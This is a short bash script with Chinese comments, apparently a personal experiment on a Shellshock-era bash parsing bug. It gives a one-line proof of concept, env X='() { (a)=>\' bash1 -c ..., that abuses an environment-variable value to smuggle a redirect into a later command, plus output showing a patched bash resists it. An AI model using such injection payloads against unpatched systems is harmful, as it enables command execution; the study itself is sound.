#!/bin/bash1




# bash 在解析到 = 号是报错 ，设置X 这个环境变量错误终止。 后面的 重定向 >\ 依然有用 并入到后面的bash命令字符串中 合并成了：  bash1 -c "> echo id"; cat echo
#env X='() { (a)=>\' bash1 -c "echo date"; cat echo


env X='() { (a)=>\' bash1 -c "echo id;env"; cat echo

# 报错之后就变成执行这个命令了
# bash1 -c "> echo id"; cat echo


# 目前bash 也已解决这个问题


# 修复之歌问题之后 变量复制成功
# X=() { (a)=>\

# root@debian32-1:~/programming/web/shellshock# env X='() { (a)=>\' bash -c "echo id;env"; cat echo
# id
# SHELL=/bin/bash
# .... 
# SSH_CONNECTION=192.168.1.100 52910 192.168.1.102 22
# DISPLAY=localhost:10.0
# _=/usr/bin/env
# cat: echo: No such file or directory


